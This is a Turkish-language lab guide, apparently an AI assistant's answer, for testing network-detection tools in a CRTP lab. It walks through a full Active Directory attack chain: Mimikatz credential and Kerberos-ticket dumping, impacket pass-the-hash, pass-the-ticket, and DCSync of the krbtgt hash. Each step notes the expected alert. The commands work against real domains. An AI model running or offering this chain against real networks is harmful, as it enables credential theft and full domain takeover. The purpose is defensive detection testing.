@@ -1,0 +1,99 @@
+Bu döküman, CRTP laboratuvar ortamınızda Vectra ve Darktrace gibi NDR çözümlerini tetiklemek amacıyla hazırlanmış, **Pass-the-Hash (PtH)** ve **Pass-the-Ticket (PtT)** tekniklerini birleştiren bir saldırı zinciri senaryosudur.
+
+---
+
+## Senaryo Özeti
+1.  **Client-1:** Yerel yönetici hash'ini ele geçir.
+2.  **Lateral Movement:** Bu hash ile Kali üzerinden Client-2'ye sıçra (PtH).
+3.  **Credential Harvesting:** Client-2'de oturumu açık olan Domain Admin'in biletini çal.
+4.  **Privilege Escalation:** Çalınan bileti belleğe yükle (PtT).
+5.  **Domain Domination:** Domain Controller'dan verileri çek (DCSync).
+
+---
+
+### 0. Ön Hazırlık ve Değişkenler
+Komutları çalıştırmadan önce hedef bilgilerinizi not edin:
+*   **Kali IP:** `10.10.10.5`
+*   **Client-1 IP:** `10.10.10.10` (User: `LocalAdmin`)
+*   **Client-2 IP:** `10.10.10.20` (User: `DomainAdmin` burada oturum açmış olmalı)
+*   **DC IP:** `10.10.10.100` (Domain: `lab.local`)
+
+---
+
+### Adım 1: Client-1 Üzerinde Hash Elde Etme
+Önce Client-1 üzerinde yerel yönetici haklarına sahip olduğunuzu varsayıyoruz. NTLM hash'ini çekelim.
+
+**Bileşen:** Client-1 (PowerShell/CMD - Yönetici olarak)
+```powershell
+# Mimikatz'ı çalıştırın ve NTLM hash'lerini dökün
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
+*   **Not:** Burada `Administrator` kullanıcısının NTLM hash'ini kaydedin (Örn: `aad3b435b51404eeaad3b435b51404ee:5f35438139281354a665243160a0f342`).
+
+---
+
+### Adım 2: Kali Üzerinden Client-2'ye Geçiş (Pass-the-Hash)
+Elde ettiğimiz hash'i kullanarak ağ üzerinden Client-2'ye parolasız giriş yapalım. Bu işlem SMB/RPC trafiği oluşturarak NDR'ı tetikleyecektir.
+
+**Bileşen:** Kali Linux (Terminal)
+```bash
+# Impacket aracını kullanarak PtH yapalım
+impacket-psexec -hashes :5f35438139281354a665243160a0f342 Administrator@10.10.10.20
+```
+*   **NDR Gözlemi:** Darktrace/Vectra üzerinde **"Administrative Tool Usage"** veya **"Suspicious Remote Service Execution"** alarmlarını kontrol edin.
+
+---
+
+### Adım 3: Client-2'de Kerberos Bileti Hırsızlığı
+Client-2'ye girdiniz. Şimdi bu makinede daha önce oturum açmış bir Domain Admin (DA) biletini (TGT) dışarı aktaracağız.
+
+**Bileşen:** Client-2 (PsExec ile açılan shell içinden)
+```powershell
+# Bellekteki Kerberos biletlerini .kirbi formatında dışarı aktar
+.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
+```
+*   **Dosya:** Klasörde `[0;xxxxx]-2-0-40e10000-DA@krbtgt-LAB.LOCAL.kirbi` gibi bir dosya oluşacaktır. Bu bilet Domain Admin'e aittir.
+
+---
+
+### Adım 4: Pass-the-Ticket (Kimlik Bürünme)
+Çaldığımız Domain Admin biletini mevcut oturumumuza enjekte edelim.
+
+**Bileşen:** Client-2 (Mevcut Shell)
+```powershell
+# Bileti mevcut oturuma yükle
+.\mimikatz.exe "kerberos::ptt [DA_BILET_ADI].kirbi" "exit"
+
+# Biletin yüklendiğini doğrula
+klist
+```
+*   **NDR Gözlemi:** Bu aşamada NDR, **"Unusual Kerberos Authentication"** uyarısı vermelidir çünkü biletin oluşturulduğu kaynak ile kullanıldığı kaynak arasında tutarsızlık vardır.
+
+---
+
+### Adım 5: DC Üzerinde Hak Sahibi Olma (DCSync)
+Artık Domain Admin yetkileriyle hareket edebilirsiniz. DC üzerindeki tüm kullanıcı hash'lerini çekerek "Domain Takeover" yapalım.
+
+**Bileşen:** Client-2 (Bilet yüklendikten sonra)
+```powershell
+# DC'den krbtgt hash'ini çekerek domaini tamamen ele geçirin
+.\mimikatz.exe "lsadump::dcsync /domain:lab.local /user:krbtgt" "exit"
+```
+*   **Alternatif (Kali üzerinden):**
+```bash
+# Bilet dosyasını Kali'ye taşıdıysanız (export KRB5CCNAME=...), şu komutu kullanın:
+impacket-secretsdump -k -no-pass lab.local/DA_USER@10.10.10.100
+```
+*   **NDR Gözlemi:** DCSync saldırısı, ağda **"Replication Traffic from Non-DC"** olarak görülür. Bu, NDR sistemleri için en kritik (High Severity) alarmdır.
+
+---
+
+### NDR İçin İpuçları (Neden Alarm Üretilmez?)
+Eğer hala alarm almıyorsanız şu iki noktaya dikkat edin:
+1.  **Trafik Hacmi:** NDR'lar bazen tekil olayları "gürültü" sayabilir. `impacket-wmiexec` yerine `psexec` kullanmak daha fazla iz bırakır (servis kurulumu yapar).
+2.  **Öğrenme Süresi:** Darktrace kuruluşu yeni yapıldıysa 7 günlük öğrenme (Learning Mode) süresinde olabilir. Bu sürede "Normal"i öğrenmeye çalıştığı için her şeyi normal kabul eder.
+3.  **Encryption:** Eğer biletlerde AES256 yerine RC4 kullanmaya zorlarsanız (`/des` veya `/rc4` parametreleri ile), NDR "Zayıf Şifreleme Kullanımı" alarmı verecektir.
+
+
+
+Bu adımları sırasıyla uyguladığınızda, hem Kali hem de Windows tarafındaki logları ve NDR arayüzünü eş zamanlı izleyerek saldırının ağdaki izdüşümünü net bir şekilde görebilirsiniz. Başka bir adımda detay isterseniz yardımcı olabilirim.
